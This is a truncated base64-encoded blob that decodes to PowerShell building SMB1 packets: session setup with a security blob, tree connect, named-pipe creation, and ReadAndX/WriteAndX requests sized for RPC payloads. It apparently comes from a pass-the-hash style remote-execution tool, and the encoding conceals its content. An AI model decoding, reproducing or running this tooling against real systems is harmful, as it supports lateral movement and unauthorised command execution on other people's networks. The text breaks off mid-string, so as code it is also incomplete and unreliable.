2VfTWVzc2FnZV9UeXBlIixbQnl0ZVtdXSgweDAwKSkNCiAgICAkcGFja2V0X05ldEJJT1NTZXNzaW9uU2VydmljZS5BZGQoIk5ldEJJT1NTZXNzaW9uU2VydmljZV9MZW5ndGgiLFtCeXRlW11dKCRwYWNrZXRfbmV0Ymlvc19zZXNzaW9uX3NlcnZpY2VfbGVuZ3RoKSkNCg0KICAgIHJldHVybiAkcGFja2V0X05ldEJJT1NTZXNzaW9uU2VydmljZQ0KfQ0KDQojU01CMQ0KDQpmdW5jdGlvbiBHZXQtUGFja2V0U01CSGVhZGVyKCkNCnsNCiAgICBwYXJhbShbQnl0ZVtdXSRwYWNrZXRfY29tbWFuZCxbQnl0ZVtdXSRwYWNrZXRfZmxhZ3MsW0J5dGVbXV0kcGFja2V0X2ZsYWdzMixbQnl0ZVtdXSRwYWNrZXRfdHJlZV9JRCxbQnl0ZVtdXSRwYWNrZXRfcHJvY2Vzc19JRCxbQnl0ZVtdXSRwYWNrZXRfdXNlcl9JRCkNCg0KICAgICRwYWNrZXRfU01CSGVhZGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuU3BlY2lhbGl6ZWQuT3JkZXJlZERpY3Rpb25hcnkNCiAgICAkcGFja2V0X1NNQkhlYWRlci5BZGQoIlNNQkhlYWRlcl9Qcm90b2NvbCIsW0J5dGVbXV0oMHhmZiwweDUzLDB4NGQsMHg0MikpDQogICAgJHBhY2tldF9TTUJIZWFkZXIuQWRkKCJTTUJIZWFkZXJfQ29tbWFuZCIsJHBhY2tldF9jb21tYW5kKQ0KICAgICRwYWNrZXRfU01CSGVhZGVyLkFkZCgiU01CSGVhZGVyX0Vycm9yQ2xhc3MiLFtCeXRlW11dKDB4MDApKQ0KICAgICRwYWNrZXRfU01CSGVhZGVyLkFkZCgiU01CSGVhZGVyX1Jlc2VydmVkIixbQnl0ZVtdXSgweDAwKSkNCiAgICAkcGFja2V0X1NNQkhlYWRlci5BZGQoIlNNQkhlYWRlcl9FcnJvckNvZGUiLFtCeXRlW11dKDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TTUJIZWFkZXIuQWRkKCJTTUJIZWFkZXJfRmxhZ3MiLCRwYWNrZXRfZmxhZ3MpDQogICAgJHBhY2tldF9TTUJIZWFkZXIuQWRkKCJTTUJIZWFkZXJfRmxhZ3MyIiwkcGFja2V0X2ZsYWdzMikNCiAgICAkcGFja2V0X1NNQkhlYWRlci5BZGQoIlNNQkhlYWRlcl9Qcm9jZXNzSURIaWdoIixbQnl0ZVtdXSgweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfU01CSGVhZGVyLkFkZCgiU01CSGVhZGVyX1NpZ25hdHVyZSIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X1NNQkhlYWRlci5BZGQoIlNNQkhlYWRlcl9SZXNlcnZlZDIiLFtCeXRlW11dKDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TTUJIZWFkZXIuQWRkKCJTTUJIZWFkZXJfVHJlZUlEIiwkcGFja2V0X3RyZWVfSUQpDQogICAgJHBhY2tldF9TTUJIZWFkZXIuQWRkKCJTTUJIZWFkZXJfUHJvY2Vzc0lEIiwkcGFja2V0X3Byb2Nlc3NfSUQpDQogICAgJHBhY2tldF9TTUJIZWFkZXIuQWRkKCJTTUJIZWFkZXJfVXNlcklEIiwkcGFja2V0X3VzZXJfSUQpDQogICAgJHBhY2tldF9TTUJIZWFkZXIuQWRkKCJTTUJIZWFkZXJfTXVsdGlwbGV4SUQiLFtCeXRlW11dKDB4MDAsMHgwMCkpDQoNCiAgICByZXR1cm4gJHBhY2tldF9TTUJIZWFkZXINCn0NCg0KZnVuY3Rpb24gR2V0LVBhY2tldFNNQk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdCgpDQp7DQogICAgcGFyYW0oW1N0cmluZ10kcGFja2V0X3ZlcnNpb24pDQoNCiAgICBpZigkcGFja2V0X3ZlcnNpb24gLWVxICdTTUIxJykNCiAgICB7DQogICAgICAgIFtCeXRlW11dJHBhY2tldF9ieXRlX2NvdW50ID0gMHgwYywweDAwDQogICAgfQ0KICAgIGVsc2UNCiAgICB7DQogICAgICAgIFtCeXRlW11dJHBhY2tldF9ieXRlX2NvdW50ID0gMHgyMiwweDAwICANCiAgICB9DQoNCiAgICAkcGFja2V0X1NNQk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkLk9yZGVyZWREaWN0aW9uYXJ5DQogICAgJHBhY2tldF9TTUJOZWdvdGlhdGVQcm90b2NvbFJlcXVlc3QuQWRkKCJTTUJOZWdvdGlhdGVQcm90b2NvbFJlcXVlc3RfV29yZENvdW50IixbQnl0ZVtdXSgweDAwKSkNCiAgICAkcGFja2V0X1NNQk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdC5BZGQoIlNNQk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdF9CeXRlQ291bnQiLCRwYWNrZXRfYnl0ZV9jb3VudCkNCiAgICAkcGFja2V0X1NNQk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdC5BZGQoIlNNQk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdF9SZXF1ZXN0ZWREaWFsZWN0c19EaWFsZWN0X0J1ZmZlckZvcm1hdCIsW0J5dGVbXV0oMHgwMikpDQogICAgJHBhY2tldF9TTUJOZWdvdGlhdGVQcm90b2NvbFJlcXVlc3QuQWRkKCJTTUJOZWdvdGlhdGVQcm90b2NvbFJlcXVlc3RfUmVxdWVzdGVkRGlhbGVjdHNfRGlhbGVjdF9OYW1lIixbQnl0ZVtdXSgweDRlLDB4NTQsMHgyMCwweDRjLDB4NGQsMHgyMCwweDMwLDB4MmUsMHgzMSwweDMyLDB4MDApKQ0KDQogICAgaWYoJHBhY2tldF92ZXJzaW9uIC1uZSAnU01CMScpDQogICAgew0KICAgICAgICAkcGFja2V0X1NNQk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdC5BZGQoIlNNQk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdF9SZXF1ZXN0ZWREaWFsZWN0c19EaWFsZWN0X0J1ZmZlckZvcm1hdDIiLFtCeXRlW11dKDB4MDIpKQ0KICAgICAgICAkcGFja2V0X1NNQk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdC5BZGQoIlNNQk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdF9SZXF1ZXN0ZWREaWFsZWN0c19EaWFsZWN0X05hbWUyIixbQnl0ZVtdXSgweDUzLDB4NGQsMHg0MiwweDIwLDB4MzIsMHgyZSwweDMwLDB4MzAsMHgzMiwweDAwKSkNCiAgICAgICAgJHBhY2tldF9TTUJOZWdvdGlhdGVQcm90b2NvbFJlcXVlc3QuQWRkKCJTTUJOZWdvdGlhdGVQcm90b2NvbFJlcXVlc3RfUmVxdWVzdGVkRGlhbGVjdHNfRGlhbGVjdF9CdWZmZXJGb3JtYXQzIixbQnl0ZVtdXSgweDAyKSkNCiAgICAgICAgJHBhY2tldF9TTUJOZWdvdGlhdGVQcm90b2NvbFJlcXVlc3QuQWRkKCJTTUJOZWdvdGlhdGVQcm90b2NvbFJlcXVlc3RfUmVxdWVzdGVkRGlhbGVjdHNfRGlhbGVjdF9OYW1lMyIsW0J5dGVbXV0oMHg1MywweDRkLDB4NDIsMHgyMCwweDMyLDB4MmUsMHgzZiwweDNmLDB4M2YsMHgwMCkpDQogICAgfQ0KDQogICAgcmV0dXJuICRwYWNrZXRfU01CTmVnb3RpYXRlUHJvdG9jb2xSZXF1ZXN0DQp9DQoNCmZ1bmN0aW9uIEdldC1QYWNrZXRTTUJTZXNzaW9uU2V0dXBBbmRYUmVxdWVzdCgpDQp7DQogICAgcGFyYW0oW0J5dGVbXV0kcGFja2V0X3NlY3VyaXR5X2Jsb2IpDQoNCiAgICBbQnl0ZVtdXSRwYWNrZXRfYnl0ZV9jb3VudCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJHBhY2tldF9zZWN1cml0eV9ibG9iLkxlbmd0aCkNCiAgICAkcGFja2V0X2J5dGVfY291bnQgPSAkcGFja2V0X2J5dGVfY291bnRbMCwxXQ0KICAgIFtCeXRlW11dJHBhY2tldF9zZWN1cml0eV9ibG9iX2xlbmd0aCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJHBhY2tldF9zZWN1cml0eV9ibG9iLkxlbmd0aCArIDUpDQogICAgJHBhY2tldF9zZWN1cml0eV9ibG9iX2xlbmd0aCA9ICRwYWNrZXRfc2VjdXJpdHlfYmxvYl9sZW5ndGhbMCwxXQ0KDQogICAgJHBhY2tldF9TTUJTZXNzaW9uU2V0dXBBbmRYUmVxdWVzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkLk9yZGVyZWREaWN0aW9uYXJ5DQogICAgJHBhY2tldF9TTUJTZXNzaW9uU2V0dXBBbmRYUmVxdWVzdC5BZGQoIlNNQlNlc3Npb25TZXR1cEFuZFhSZXF1ZXN0X1dvcmRDb3VudCIsW0J5dGVbXV0oMHgwYykpDQogICAgJHBhY2tldF9TTUJTZXNzaW9uU2V0dXBBbmRYUmVxdWVzdC5BZGQoIlNNQlNlc3Npb25TZXR1cEFuZFhSZXF1ZXN0X0FuZFhDb21tYW5kIixbQnl0ZVtdXSgweGZmKSkNCiAgICAkcGFja2V0X1NNQlNlc3Npb25TZXR1cEFuZFhSZXF1ZXN0LkFkZCgiU01CU2Vzc2lvblNldHVwQW5kWFJlcXVlc3RfUmVzZXJ2ZWQiLFtCeXRlW11dKDB4MDApKQ0KICAgICRwYWNrZXRfU01CU2Vzc2lvblNldHVwQW5kWFJlcXVlc3QuQWRkKCJTTUJTZXNzaW9uU2V0dXBBbmRYUmVxdWVzdF9BbmRYT2Zmc2V0IixbQnl0ZVtdXSgweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfU01CU2Vzc2lvblNldHVwQW5kWFJlcXVlc3QuQWRkKCJTTUJTZXNzaW9uU2V0dXBBbmRYUmVxdWVzdF9NYXhCdWZmZXIiLFtCeXRlW11dKDB4ZmYsMHhmZikpDQogICAgJHBhY2tldF9TTUJTZXNzaW9uU2V0dXBBbmRYUmVxdWVzdC5BZGQoIlNNQlNlc3Npb25TZXR1cEFuZFhSZXF1ZXN0X01heE1weENvdW50IixbQnl0ZVtdXSgweDAyLDB4MDApKQ0KICAgICRwYWNrZXRfU01CU2Vzc2lvblNldHVwQW5kWFJlcXVlc3QuQWRkKCJTTUJTZXNzaW9uU2V0dXBBbmRYUmVxdWVzdF9WQ051bWJlciIsW0J5dGVbXV0oMHgwMSwweDAwKSkNCiAgICAkcGFja2V0X1NNQlNlc3Npb25TZXR1cEFuZFhSZXF1ZXN0LkFkZCgiU01CU2Vzc2lvblNldHVwQW5kWFJlcXVlc3RfU2Vzc2lvbktleSIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TTUJTZXNzaW9uU2V0dXBBbmRYUmVxdWVzdC5BZGQoIlNNQlNlc3Npb25TZXR1cEFuZFhSZXF1ZXN0X1NlY3VyaXR5QmxvYkxlbmd0aCIsJHBhY2tldF9ieXRlX2NvdW50KQ0KICAgICRwYWNrZXRfU01CU2Vzc2lvblNldHVwQW5kWFJlcXVlc3QuQWRkKCJTTUJTZXNzaW9uU2V0dXBBbmRYUmVxdWVzdF9SZXNlcnZlZDIiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfU01CU2Vzc2lvblNldHVwQW5kWFJlcXVlc3QuQWRkKCJTTUJTZXNzaW9uU2V0dXBBbmRYUmVxdWVzdF9DYXBhYmlsaXRpZXMiLFtCeXRlW11dKDB4NDQsMHgwMCwweDAwLDB4ODApKQ0KICAgICRwYWNrZXRfU01CU2Vzc2lvblNldHVwQW5kWFJlcXVlc3QuQWRkKCJTTUJTZXNzaW9uU2V0dXBBbmRYUmVxdWVzdF9CeXRlQ291bnQiLCRwYWNrZXRfc2VjdXJpdHlfYmxvYl9sZW5ndGgpDQogICAgJHBhY2tldF9TTUJTZXNzaW9uU2V0dXBBbmRYUmVxdWVzdC5BZGQoIlNNQlNlc3Npb25TZXR1cEFuZFhSZXF1ZXN0X1NlY3VyaXR5QmxvYiIsJHBhY2tldF9zZWN1cml0eV9ibG9iKQ0KICAgICRwYWNrZXRfU01CU2Vzc2lvblNldHVwQW5kWFJlcXVlc3QuQWRkKCJTTUJTZXNzaW9uU2V0dXBBbmRYUmVxdWVzdF9OYXRpdmVPUyIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfU01CU2Vzc2lvblNldHVwQW5kWFJlcXVlc3QuQWRkKCJTTUJTZXNzaW9uU2V0dXBBbmRYUmVxdWVzdF9OYXRpdmVMQU5NYW5hZ2UiLFtCeXRlW11dKDB4MDAsMHgwMCkpDQoNCiAgICByZXR1cm4gJHBhY2tldF9TTUJTZXNzaW9uU2V0dXBBbmRYUmVxdWVzdCANCn0NCg0KZnVuY3Rpb24gR2V0LVBhY2tldFNNQlRyZWVDb25uZWN0QW5kWFJlcXVlc3QoKQ0Kew0KICAgIHBhcmFtKFtCeXRlW11dJHBhY2tldF9wYXRoKQ0KDQogICAgW0J5dGVbXV0kcGFja2V0X3BhdGhfbGVuZ3RoID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkcGFja2V0X3BhdGguTGVuZ3RoICsgNykNCiAgICAkcGFja2V0X3BhdGhfbGVuZ3RoID0gJHBhY2tldF9wYXRoX2xlbmd0aFswLDFdDQoNCiAgICAkcGFja2V0X1NNQlRyZWVDb25uZWN0QW5kWFJlcXVlc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5TcGVjaWFsaXplZC5PcmRlcmVkRGljdGlvbmFyeQ0KICAgICRwYWNrZXRfU01CVHJlZUNvbm5lY3RBbmRYUmVxdWVzdC5BZGQoIlNNQlRyZWVDb25uZWN0QW5kWFJlcXVlc3RfV29yZENvdW50IixbQnl0ZVtdXSgweDA0KSkNCiAgICAkcGFja2V0X1NNQlRyZWVDb25uZWN0QW5kWFJlcXVlc3QuQWRkKCJTTUJUcmVlQ29ubmVjdEFuZFhSZXF1ZXN0X0FuZFhDb21tYW5kIixbQnl0ZVtdXSgweGZmKSkNCiAgICAkcGFja2V0X1NNQlRyZWVDb25uZWN0QW5kWFJlcXVlc3QuQWRkKCJTTUJUcmVlQ29ubmVjdEFuZFhSZXF1ZXN0X1Jlc2VydmVkIixbQnl0ZVtdXSgweDAwKSkNCiAgICAkcGFja2V0X1NNQlRyZWVDb25uZWN0QW5kWFJlcXVlc3QuQWRkKCJTTUJUcmVlQ29ubmVjdEFuZFhSZXF1ZXN0X0FuZFhPZmZzZXQiLFtCeXRlW11dKDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TTUJUcmVlQ29ubmVjdEFuZFhSZXF1ZXN0LkFkZCgiU01CVHJlZUNvbm5lY3RBbmRYUmVxdWVzdF9GbGFncyIsW0J5dGVbXV0oMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X1NNQlRyZWVDb25uZWN0QW5kWFJlcXVlc3QuQWRkKCJTTUJUcmVlQ29ubmVjdEFuZFhSZXF1ZXN0X1Bhc3N3b3JkTGVuZ3RoIixbQnl0ZVtdXSgweDAxLDB4MDApKQ0KICAgICRwYWNrZXRfU01CVHJlZUNvbm5lY3RBbmRYUmVxdWVzdC5BZGQoIlNNQlRyZWVDb25uZWN0QW5kWFJlcXVlc3RfQnl0ZUNvdW50IiwkcGFja2V0X3BhdGhfbGVuZ3RoKQ0KICAgICRwYWNrZXRfU01CVHJlZUNvbm5lY3RBbmRYUmVxdWVzdC5BZGQoIlNNQlRyZWVDb25uZWN0QW5kWFJlcXVlc3RfUGFzc3dvcmQiLFtCeXRlW11dKDB4MDApKQ0KICAgICRwYWNrZXRfU01CVHJlZUNvbm5lY3RBbmRYUmVxdWVzdC5BZGQoIlNNQlRyZWVDb25uZWN0QW5kWFJlcXVlc3RfVHJlZSIsJHBhY2tldF9wYXRoKQ0KICAgICRwYWNrZXRfU01CVHJlZUNvbm5lY3RBbmRYUmVxdWVzdC5BZGQoIlNNQlRyZWVDb25uZWN0QW5kWFJlcXVlc3RfU2VydmljZSIsW0J5dGVbXV0oMHgzZiwweDNmLDB4M2YsMHgzZiwweDNmLDB4MDApKQ0KDQogICAgcmV0dXJuICRwYWNrZXRfU01CVHJlZUNvbm5lY3RBbmRYUmVxdWVzdA0KfQ0KDQpmdW5jdGlvbiBHZXQtUGFja2V0U01CTlRDcmVhdGVBbmRYUmVxdWVzdCgpDQp7DQogICAgcGFyYW0oW0J5dGVbXV0kcGFja2V0X25hbWVkX3BpcGUpDQoNCiAgICBbQnl0ZVtdXSRwYWNrZXRfbmFtZWRfcGlwZV9sZW5ndGggPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRwYWNrZXRfbmFtZWRfcGlwZS5MZW5ndGgpDQogICAgJHBhY2tldF9uYW1lZF9waXBlX2xlbmd0aCA9ICRwYWNrZXRfbmFtZWRfcGlwZV9sZW5ndGhbMCwxXQ0KICAgIFtCeXRlW11dJHBhY2tldF9maWxlX25hbWVfbGVuZ3RoID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkcGFja2V0X25hbWVkX3BpcGUuTGVuZ3RoIC0gMSkNCiAgICAkcGFja2V0X2ZpbGVfbmFtZV9sZW5ndGggPSAkcGFja2V0X2ZpbGVfbmFtZV9sZW5ndGhbMCwxXQ0KDQogICAgJHBhY2tldF9TTUJOVENyZWF0ZUFuZFhSZXF1ZXN0ID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuU3BlY2lhbGl6ZWQuT3JkZXJlZERpY3Rpb25hcnkNCiAgICAkcGFja2V0X1NNQk5UQ3JlYXRlQW5kWFJlcXVlc3QuQWRkKCJTTUJOVENyZWF0ZUFuZFhSZXF1ZXN0X1dvcmRDb3VudCIsW0J5dGVbXV0oMHgxOCkpDQogICAgJHBhY2tldF9TTUJOVENyZWF0ZUFuZFhSZXF1ZXN0LkFkZCgiU01CTlRDcmVhdGVBbmRYUmVxdWVzdF9BbmRYQ29tbWFuZCIsW0J5dGVbXV0oMHhmZikpDQogICAgJHBhY2tldF9TTUJOVENyZWF0ZUFuZFhSZXF1ZXN0LkFkZCgiU01CTlRDcmVhdGVBbmRYUmVxdWVzdF9SZXNlcnZlZCIsW0J5dGVbXV0oMHgwMCkpDQogICAgJHBhY2tldF9TTUJOVENyZWF0ZUFuZFhSZXF1ZXN0LkFkZCgiU01CTlRDcmVhdGVBbmRYUmVxdWVzdF9BbmRYT2Zmc2V0IixbQnl0ZVtdXSgweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfU01CTlRDcmVhdGVBbmRYUmVxdWVzdC5BZGQoIlNNQk5UQ3JlYXRlQW5kWFJlcXVlc3RfUmVzZXJ2ZWQyIixbQnl0ZVtdXSgweDAwKSkNCiAgICAkcGFja2V0X1NNQk5UQ3JlYXRlQW5kWFJlcXVlc3QuQWRkKCJTTUJOVENyZWF0ZUFuZFhSZXF1ZXN0X0ZpbGVOYW1lTGVuIiwkcGFja2V0X2ZpbGVfbmFtZV9sZW5ndGgpDQogICAgJHBhY2tldF9TTUJOVENyZWF0ZUFuZFhSZXF1ZXN0LkFkZCgiU01CTlRDcmVhdGVBbmRYUmVxdWVzdF9DcmVhdGVGbGFncyIsW0J5dGVbXV0oMHgxNiwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TTUJOVENyZWF0ZUFuZFhSZXF1ZXN0LkFkZCgiU01CTlRDcmVhdGVBbmRYUmVxdWVzdF9Sb290RklEIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X1NNQk5UQ3JlYXRlQW5kWFJlcXVlc3QuQWRkKCJTTUJOVENyZWF0ZUFuZFhSZXF1ZXN0X0FjY2Vzc01hc2siLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDIpKQ0KICAgICRwYWNrZXRfU01CTlRDcmVhdGVBbmRYUmVxdWVzdC5BZGQoIlNNQk5UQ3JlYXRlQW5kWFJlcXVlc3RfQWxsb2NhdGlvblNpemUiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TTUJOVENyZWF0ZUFuZFhSZXF1ZXN0LkFkZCgiU01CTlRDcmVhdGVBbmRYUmVxdWVzdF9GaWxlQXR0cmlidXRlcyIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TTUJOVENyZWF0ZUFuZFhSZXF1ZXN0LkFkZCgiU01CTlRDcmVhdGVBbmRYUmVxdWVzdF9TaGFyZUFjY2VzcyIsW0J5dGVbXV0oMHgwNywweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TTUJOVENyZWF0ZUFuZFhSZXF1ZXN0LkFkZCgiU01CTlRDcmVhdGVBbmRYUmVxdWVzdF9EaXNwb3NpdGlvbiIsW0J5dGVbXV0oMHgwMSwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TTUJOVENyZWF0ZUFuZFhSZXF1ZXN0LkFkZCgiU01CTlRDcmVhdGVBbmRYUmVxdWVzdF9DcmVhdGVPcHRpb25zIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X1NNQk5UQ3JlYXRlQW5kWFJlcXVlc3QuQWRkKCJTTUJOVENyZWF0ZUFuZFhSZXF1ZXN0X0ltcGVyc29uYXRpb24iLFtCeXRlW11dKDB4MDIsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfU01CTlRDcmVhdGVBbmRYUmVxdWVzdC5BZGQoIlNNQk5UQ3JlYXRlQW5kWFJlcXVlc3RfU2VjdXJpdHlGbGFncyIsW0J5dGVbXV0oMHgwMCkpDQogICAgJHBhY2tldF9TTUJOVENyZWF0ZUFuZFhSZXF1ZXN0LkFkZCgiU01CTlRDcmVhdGVBbmRYUmVxdWVzdF9CeXRlQ291bnQiLCRwYWNrZXRfbmFtZWRfcGlwZV9sZW5ndGgpDQogICAgJHBhY2tldF9TTUJOVENyZWF0ZUFuZFhSZXF1ZXN0LkFkZCgiU01CTlRDcmVhdGVBbmRYUmVxdWVzdF9GaWxlbmFtZSIsJHBhY2tldF9uYW1lZF9waXBlKQ0KDQogICAgcmV0dXJuICRwYWNrZXRfU01CTlRDcmVhdGVBbmRYUmVxdWVzdA0KfQ0KDQpmdW5jdGlvbiBHZXQtUGFja2V0U01CUmVhZEFuZFhSZXF1ZXN0KCkNCnsNCiAgICAkcGFja2V0X1NNQlJlYWRBbmRYUmVxdWVzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkLk9yZGVyZWREaWN0aW9uYXJ5DQogICAgJHBhY2tldF9TTUJSZWFkQW5kWFJlcXVlc3QuQWRkKCJTTUJSZWFkQW5kWFJlcXVlc3RfV29yZENvdW50IixbQnl0ZVtdXSgweDBhKSkNCiAgICAkcGFja2V0X1NNQlJlYWRBbmRYUmVxdWVzdC5BZGQoIlNNQlJlYWRBbmRYUmVxdWVzdF9BbmRYQ29tbWFuZCIsW0J5dGVbXV0oMHhmZikpDQogICAgJHBhY2tldF9TTUJSZWFkQW5kWFJlcXVlc3QuQWRkKCJTTUJSZWFkQW5kWFJlcXVlc3RfUmVzZXJ2ZWQiLFtCeXRlW11dKDB4MDApKQ0KICAgICRwYWNrZXRfU01CUmVhZEFuZFhSZXF1ZXN0LkFkZCgiU01CUmVhZEFuZFhSZXF1ZXN0X0FuZFhPZmZzZXQiLFtCeXRlW11dKDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TTUJSZWFkQW5kWFJlcXVlc3QuQWRkKCJTTUJSZWFkQW5kWFJlcXVlc3RfRklEIixbQnl0ZVtdXSgweDAwLDB4NDApKQ0KICAgICRwYWNrZXRfU01CUmVhZEFuZFhSZXF1ZXN0LkFkZCgiU01CUmVhZEFuZFhSZXF1ZXN0X09mZnNldCIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TTUJSZWFkQW5kWFJlcXVlc3QuQWRkKCJTTUJSZWFkQW5kWFJlcXVlc3RfTWF4Q291bnRMb3ciLFtCeXRlW11dKDB4NTgsMHgwMikpDQogICAgJHBhY2tldF9TTUJSZWFkQW5kWFJlcXVlc3QuQWRkKCJTTUJSZWFkQW5kWFJlcXVlc3RfTWluQ291bnQiLFtCeXRlW11dKDB4NTgsMHgwMikpDQogICAgJHBhY2tldF9TTUJSZWFkQW5kWFJlcXVlc3QuQWRkKCJTTUJSZWFkQW5kWFJlcXVlc3RfVW5rbm93biIsW0J5dGVbXV0oMHhmZiwweGZmLDB4ZmYsMHhmZikpDQogICAgJHBhY2tldF9TTUJSZWFkQW5kWFJlcXVlc3QuQWRkKCJTTUJSZWFkQW5kWFJlcXVlc3RfUmVtYWluaW5nIixbQnl0ZVtdXSgweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfU01CUmVhZEFuZFhSZXF1ZXN0LkFkZCgiU01CUmVhZEFuZFhSZXF1ZXN0X0J5dGVDb3VudCIsW0J5dGVbXV0oMHgwMCwweDAwKSkNCg0KICAgIHJldHVybiAkcGFja2V0X1NNQlJlYWRBbmRYUmVxdWVzdA0KfQ0KDQpmdW5jdGlvbiBHZXQtUGFja2V0U01CV3JpdGVBbmRYUmVxdWVzdCgpDQp7DQogICAgcGFyYW0oW0ludF0kcGFja2V0X1JQQ19sZW5ndGgpDQoNCiAgICBbQnl0ZVtdXSRwYWNrZXRfd3JpdGVfbGVuZ3RoID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkcGFja2V0X1JQQ19sZW5ndGggKyAyNCkNCiAgICAkcGFja2V0X3dyaXRlX2xlbmd0aCA9ICRwYWNrZXRfd3JpdGVfbGVuZ3RoWzAsMV0NCg0KICAgICRwYWNrZXRfU01CV3JpdGVBbmRYUmVxdWVzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkLk9yZGVyZWREaWN0aW9uYXJ5DQogICAgJHBhY2tldF9TTUJXcml0ZUFuZFhSZXF1ZXN0LkFkZCgiU01CV3JpdGVBbmRYUmVxdWVzdF9Xb3JkQ291bnQiLFtCeXRlW11dKDB4MGUpKQ0KICAgICRwYWNrZXRfU01CV3JpdGVBbmRYUmVxdWVzdC5BZGQoIlNNQldyaXRlQW5kWFJlcXVlc3RfQW5kWENvbW1hbmQiLFtCeXRlW11dKDB4ZmYpKQ0KICAgICRwYWNrZXRfU01CV3JpdGVBbmRYUmVxdWVzdC5BZGQoIlNNQldyaXRlQW5kWFJlcXVlc3RfUmVzZXJ2ZWQiLFtCeXRlW11dKDB4MDApKQ0KICAgICRwYWNrZXRfU01CV3JpdGVBbmRYUmVxdWVzdC5BZGQoIlNNQldyaXRlQW5kWFJlcXVlc3RfQW5kWE9mZnNldCIsW0J5dGVbXV0oMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X1NNQldyaXRlQW5kWFJlcXVlc3QuQWRkKCJTTUJXcml0ZUFuZFhSZXF1ZXN0X0ZJRCIsW0J5dGVbXV0oMHgwMCwweDQwKSkNCiAgICAkcGFja2V0X1NNQldyaXRlQW5kWFJlcXVlc3QuQWRkKCJTTUJXcml0ZUFuZFhSZXF1ZXN0X09mZnNldCIsW0J5dGVbXV0oMHhlYSwweDAzLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TTUJXcml0ZUFuZFhSZXF1ZXN0LkFkZCgiU01CV3JpdGVBbmRYUmVxdWVzdF9SZXNlcnZlZDIiLFtCeXRlW11dKDB4ZmYsMHhmZiwweGZmLDB4ZmYpKQ0KICAgICRwYWNrZXRfU01CV3JpdGVBbmRYUmVxdWVzdC5BZGQoIlNNQldyaXRlQW5kWFJlcXVlc3RfV3JpdGVNb2RlIixbQnl0ZVtdXSgweDA4LDB4MDApKQ0KICAgICRwYWNrZXRfU01CV3JpdGVBbmRYUmVxdWVzdC5BZGQoIlNNQldyaXRlQW5kWFJlcXVlc3RfUmVtYWluaW5nIixbQnl0ZVtdXSgweDUwLDB4MDApKQ0KICAgICRwYWNrZXRfU01CV3JpdGVBbmRYUmVxdWVzdC5BZGQoIlNNQldyaXRlQW5kWFJlcXVlc3RfRGF0YUxlbmd0aEhpZ2giLFtCeXRlW11dKDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TTUJXcml0ZUFuZFhSZXF1ZXN0LkFkZCgiU01CV3JpdGVBbmRYUmVxdWVzdF9EYXRhTGVuZ3RoTG93IiwkcGFja2V0X3dyaXRlX2xlbmd0aCkNCiAgICAkcGFja2V0X1NNQldyaXRlQW5kWFJlcXVlc3QuQWRkKCJTTUJXcml0ZUFuZFhSZXF1ZXN0X0RhdGFPZmZzZXQiLFtCeXRlW11dKDB4M2YsMHgwMCkpDQogICAgJHBhY2tldF9TTUJXc